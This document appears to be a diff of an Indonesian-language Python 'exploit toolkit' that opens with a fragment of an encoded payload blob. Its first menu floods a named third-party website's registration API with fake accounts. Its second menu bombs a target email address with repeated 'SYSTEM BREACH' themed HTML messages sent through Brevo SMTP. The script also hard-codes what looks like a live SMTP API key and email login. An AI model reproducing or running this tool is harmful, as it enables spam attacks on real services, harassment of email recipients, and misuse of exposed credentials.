AAAHIUAAAAchYAAAByFQAAAHIYAAAAchkAAAByFwAAAHIgAAAAch8AAAByHgAAAHILAAAAcikAAAByOQAAAHJFAAAAckkAAABydQAAAHKEAAAAcpMAAADaCF9fbmFtZV9f2hFLZXlib2FyZEludGVycnVwdHIPAAAAchAAAAByEQAAANoIPG1vZHVsZT5ymwAAAAEAAABzCQEAAPADAQEB2wAP2wAN2wAN2wAL2wAJ2wAK2wAJ2wAR2wAL3QAx8AYFAQ/fBCrRBCrZBAiQNNUEGPAQAA45gArYESCADvAGAAkTgAXYChSAB9gLFYAI2AkTgAbYDBaACdgJE4AG2AoUgAfYChOAB9gJEoAG8gQBATXyBhkBGPI2DAES8hwFARfyDgIBHPIIGQEV8jYaAVcB8jhHAQEa8FICAAQMiHrUAxnwAgQFE9kIDI4G8QUABBr48FkGAAgT9AACAQ/ZBAnQCi7UBC/YBAeHSIJIhkrwBQIBD/vwXgYADB30AAIFE9kIDZACkDWQJ9AZPbhnuFnQDkfUCEjYCAuPCIoIjwrwBQIFE/pzIwAAAKwTQgAAwTUHQiYAwgAgQiMDwiIBQiMDwiYmQxADww8BQxAD')))
+import requests
+import random
+import string
+import time
+import os
+import sys
+import re
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from concurrent.futures import ThreadPoolExecutor
+
+try:
+    from colorama import init, Fore, Style
+    init(autoreset=True)
+except ImportError:
+    print("[-] Install dulu: pip install colorama requests")
+    sys.exit()
+
+# ==========================================
+# KONFIGURASI
+# ==========================================
+NOVA_URL = "https://nova-wawa.vercel.app/api/register"
+USED_KEYS_FILE = "used_keys.txt"
+
+# KONFIGURASI BREVO SMTP (SESUAI PUNYA LO)
+BREVO_SMTP_SERVER = "smtp-relay.brevo.com"
+BREVO_SMTP_PORT = 587
+BREVO_SMTP_LOGIN = "ttingg48@gmail.com" 
+BREVO_SMTP_PASSWORD = "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" 
+PENGIRIM_EMAIL = "ttingg48@gmail.com" 
+
+# Warna ANSI RGB
+C_RED = '\033[91m'
+C_GREEN = '\033[92m'
+C_YELLOW = '\033[93m'
+C_BLUE = '\033[94m'
+C_MAGENTA = '\033[95m'
+C_CYAN = '\033[96m'
+C_WHITE = '\033[97m'
+C_RESET = '\033[0m'
+C_BOLD = '\033[1m'
+
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def animasi_banner():
+    ascii_art = [
+        "██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
+        "██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
+        "██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
+        "██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
+        "██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
+        "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
+    ]
+    colors = [C_RED, C_YELLOW, C_GREEN, C_CYAN, C_BLUE, C_MAGENTA]
+    for shift in range(15):
+        clear()
+        print("\n")
+        for i, line in enumerate(ascii_art):
+            color_idx = (i + shift) % len(colors)
+            print(f"{colors[color_idx]}{C_BOLD}{line}{C_RESET}")
+        print(f"\n{C_WHITE}                        [ PREMIUM TOOLKING V3 ]{C_RESET}")
+        print(f"{C_WHITE}                              Dev: BARA{C_RESET}\n")
+        time.sleep(0.05)
+
+def get_decrypted_keys():
+    try:
+        with open("apikey.js", "r", encoding="utf-8") as f:
+            content = f.read()
+        keys = re.findall(r'"([^"]+)"', content)
+        return [k for k in keys if "bara" in k or "vip" in k]
+    except:
+        return []
+
+# ==========================================
+# MENU 1: SPAM LOGIN (NOVA WAWA)
+# ==========================================
+def tembak_register():
+    rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))
+    timestamp = int(time.time() * 1000) 
+    prefix = random.choice(["User", "VIP", "Siswa", "Member", "Baru", "Bara", "Anon"])
+    nama = f"{prefix}_{rand_str}"
+    password = f"Qwerty{random.randint(100, 999)}!"
+    
+    payload = {
+        "full_name": nama,
+        "birth_year": str(random.randint(1990, 2006)),
+        "email": f"{nama.lower()}_{timestamp}@gmail.com",
+        "password": password,
+        "agree": True
+    }
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
+        "Origin": "https://nova-wawa.vercel.app"
+    }
+    try:
+        res = requests.post(NOVA_URL, json=payload, headers=headers, timeout=5)
+        return res.status_code in [200, 201]
+    except:
+        return False
+
+def eksekusi_spam_login():
+    clear()
+    print(f"{C_CYAN}=== SPAM LOGIN NOVA WAWA ==={C_RESET}")
+    try:
+        jumlah = int(input(f"{C_YELLOW}Masukkan jumlah spam (max 500): {C_RESET}"))
+    except:
+        return
+    
+    print(f"\n{C_YELLOW}[*] Menyiapkan {jumlah} akun...{C_RESET}")
+    start_time = time.time()
+    sukses = 0
+    
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(tembak_register) for _ in range(jumlah)]
+        for i, f in enumerate(futures):
+            if f.result(): sukses += 1
+            percent = int((i + 1) / jumlah * 100)
+            sys.stdout.write(f"\r{C_GREEN}[Progress] {percent}% ({sukses} Sukses){C_RESET}")
+            sys.stdout.flush()
+            
+    elapsed = time.time() - start_time
+    print(f"\n\n{C_GREEN}[✅] SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")
+    input(f"\n{C_CYAN}Tekan Enter buat balik...{C_RESET}")
+
+# ==========================================
+# MENU 2: SPAM EMAIL (BREVO SMTP + UI HACKER)
+# ==========================================
+def kirim_email_brevo(target, pesan):
+    # UI HTML VIBECODE HACKER THEME + GAMBAR + AUDIO TOGGLE
+    html_content = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=Orbitron:wght@700;900&display=swap');
+            
+            body {{ 
+                margin: 0; padding: 40px 20px; 
+                font-family: 'Fira Code', monospace; 
+                background-color: #050505;
+                background-image: 
+                    linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
+                background-size: 20px 20px;
+                color: #00ff41;
+                min-height: 100vh; display: flex; justify-content: center; align-items: center;
+            }}
+            
+            .card {{ 
+                background: rgba(10, 10, 10, 0.9); 
+                border: 2px solid #00ff41;
+                box-shadow: 0 0 20px rgba(0, 255, 65, 0.3), inset 0 0 20px rgba(0, 255, 65, 0.1);
+                padding: 30px; border-radius: 12px; 
+                max-width: 500px; width: 100%; text-align: center; 
+                position: relative;
+            }}
+            
+            .glitch-text {{
+                font-family: 'Orbitron', sans-serif;
+                font-size: 28px; font-weight: 900;
+                color: #ff003c;
+                text-transform: uppercase;
+                letter-spacing: 2px;
+                text-shadow: 2px 2px 0px #00ff41, -2px -2px 0px #00b0ff;
+                margin-bottom: 20px;
+            }}
+            
+            .gambar {{
+                width: 100%;
+                max-height: 200px;
+                object-fit: cover;
+                border-radius: 8px;
+                border: 1px solid #00ff41;
+                margin-bottom: 20px;
+                filter: grayscale(20%) contrast(120%);
+            }}
+            
+            .pesan-box {{
+                background: rgba(0, 255, 65, 0.1);
+                border-left: 4px solid #00ff41;
+                padding: 15px;
+                text-align: left;
+                margin-bottom: 25px;
+                font-size: 15px;
+                color: #fff;
+            }}
+            
+            /* Tombol Audio Tanpa JS */
+            details {{
+                margin-bottom: 20px;
+                text-align: left;
+            }}
+            summary {{
+                background: #111;
+                border: 1px solid #00ff41;
+                color: #00ff41;
+                padding: 10px;
+                border-radius: 6px;
+                cursor: pointer;
+                font-weight: bold;
+                text-align: center;
+                user-select: none;
+            }}
+            summary:hover {{ background: #1a1a1a; }}
+            audio {{ width: 100%; margin-top: 10px; outline: none; filter: invert(1); }}
+            
+            .footer {{ 
+                font-size: 11px; color: #555; text-transform: uppercase;
+                letter-spacing: 2px; margin-top: 30px;
+                border-top: 1px dashed #333; padding-top: 15px;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="card">
+            <div class="glitch-text">SYSTEM BREACH</div>
+            
+            <img src="https://files.catbox.moe/n04bax.png" class="gambar" alt="Bara Exploit">
+            
+            <div class="pesan-box">
+                <span style="color: #ff003c;">>_ </span> {pesan}
+            </div>
+            
+            <details>
+                <summary>🔊 TEKAN UNTUK BUKA AUDIO</summary>
+                <audio controls loop>
+                    <source src="https://files.catbox.moe/6xi33i.mp3" type="audio/mpeg">
+                    Browser lo nggak support audio.
+                </audio>
+            </details>
+            
+            <div class="footer">DEV: BARA | BARA EXPLOIT TOOLKING</div>
+        </div>
+    </body>
+    </html>
+    """
+
+    msg = MIMEMultipart()
+    msg['From'] = PENGIRIM_EMAIL
+    msg['To'] = target
+    msg['Subject'] = f"⚠️ SYSTEM ALERT {random.randint(100, 999)}"
+
+    msg.attach(MIMEText(html_content, 'html'))
+
+    try:
+        server = smtplib.SMTP(BREVO_SMTP_SERVER, BREVO_SMTP_PORT)
+        server.starttls()
+        server.login(BREVO_SMTP_LOGIN, BREVO_SMTP_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+        return True
+    except Exception as e:
+        # Kalo error, print di console biar ketauan (opsional)
+        # print(f"[-] Error SMTP: {e}")
+        return False
+
+def eksekusi_spam_email():
+    clear()
+    print(f"{C_CYAN}=== SPAM EMAIL (BREVO SMTP) ==={C_RESET}")
+    target = input(f"{C_YELLOW}Masukkan Email Target (Gmail): {C_RESET}")
+    pesan = input(f"{C_YELLOW}Masukkan Pesan (contoh: BaraGanteng Jangan Dilawan): {C_RESET}")
+    try:
+        jumlah = int(input(f"{C_YELLOW}Mau spam berapa kali?: {C_RESET}"))
+    except:
+        return
+
+    print(f"\n{C_YELLOW}[*] Memproses spam email ke {target}...{C_RESET}")
+    sukses = 0
+    
+    for i in range(1, jumlah + 1):
+        if kirim_email_brevo(target, pesan):
+            sukses += 1
+            print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
+        else:
+            print(f"{C_RED}[❌] [{i}/{jumlah}] Gagal (Cek SMTP Brevo lo).{C_RESET}")
+            
+        time.sleep(1.5) # Jeda wajib biar ga diblokir Brevo
+        
+    print(f"\n{C_GREEN}[✅] Selesai! Sukses: {sukses}/{jumlah}{C_RESET}")
+    input(f"\n{C_CYAN}Tekan Enter buat balik...{C_RESET}")
+
+# ==========================================
+# MAIN MENU
+# ==========================================
+def main():
+    animasi_banner()
+    
+    valid_keys = get_decrypted_keys()
+    if not valid_keys:
+        print(f"{C_RED}[❌] File apikey.js nggak ketemu!{C_RESET}")
+        sys.exit()
+
+    print(f"{C_YELLOW}Masukkan API Key lo: {C_RESET}")
+    user_key = input("> ").strip()
+
+    if user_key not in valid_keys:
+        print(f"\n{C_RED}[❌] API KEY TIDAK VALID! Akses Ditolak.{C_RESET}")
+        sys.exit()
+
+    if os.path.exists(USED_KEYS_FILE):
+        with open(USED_KEYS_FILE, "r") as f:
+            if user_key in f.read().splitlines():
+                print(f"\n{C_RED}[❌] API KEY SUDAH DIPAKAI! Key hangus.{C_RESET}")
+                sys.exit()
+
+    with open(USED_KEYS_FILE, "a") as f:
+        f.write(user_key + "\n")
+        
+    print(f"{C_GREEN}[✅] API KEY VALID!{C_RESET}")
+    time.sleep(1)
+
+    while True:
+        clear()
+        m_colors = [C_CYAN, C_MAGENTA, C_GREEN]
+        m_c = m_colors[int(time.time()) % 3]
+        
+        print(f"""{m_c}
+======================================================
+                BARA EXPLOIT - MAIN MENU
+======================================================
+{C_YELLOW}1. {C_WHITE}Spam Login (Nova Wawa)
+{C_YELLOW}2. {C_WHITE}Spam Email (Brevo SMTP + Vibecode UI)
+{C_YELLOW}0. {C_WHITE}Keluar
+{m_c}======================================================
+{C_WHITE}Dev: BARA | API Key: {user_key[:5]}***{C_RESET}""")
+        
+        pilihan = input(f"{C_YELLOW}Pilih menu (0-2): {C_RESET}").strip()
+
+        if pilihan == '1':
+            eksekusi_spam_login()
+        elif pilihan == '2':
+            eksekusi_spam_email()
+        elif pilihan == '0':
+            print(f"{C_RED}[!] Keluar...{C_RESET}")
+            sys.exit()
+        else:
+            print(f"{C_RED}[!] Pilihan tidak valid!{C_RESET}")
+            time.sleep(1)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{C_RED}[!] Dihentikan sama user.{C_RESET}")
+        sys.exit()
